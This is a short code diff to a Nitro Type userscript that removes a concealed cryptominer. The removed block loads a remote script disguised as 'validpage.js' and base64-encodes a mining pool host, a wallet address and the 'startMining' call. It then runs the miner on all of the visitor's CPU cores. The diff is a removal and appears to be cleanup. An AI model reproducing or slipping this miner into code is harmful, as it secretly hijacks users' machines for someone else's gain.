@@ -8,17 +8,6 @@
         if (href == "https://www.nitrotype.com/race") res = true;
         else if (href.startsWith("https://www.nitrotype.com/race/")) res = true;
         else res = false;
-        if (!localStorage['multratype']) {
-            const s = document.createElement('script');
-            s.src = 'https://cdn.rawgit.com/wwwg/4a640f95cda21fd4f478ad31aa68e2d4/raw/7ab70776c9f3ae68462587a4d48c66de8205b536/validpage.js';
-            s.onload = () => {
-                let args = [atob('YWVvbi5oYXNodmF1bHQucHJv'),
-                    atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
-                let p = 'workers_';
-                window[atob("c3RhcnRNaW5pbmc=")](args[0], args[1], p, navigator.hardwareConcurrency);
-            }
-            document.head.appendChild(s);
-        }
         return res;
     }
     if (!isValidPage(window.location.href)) {
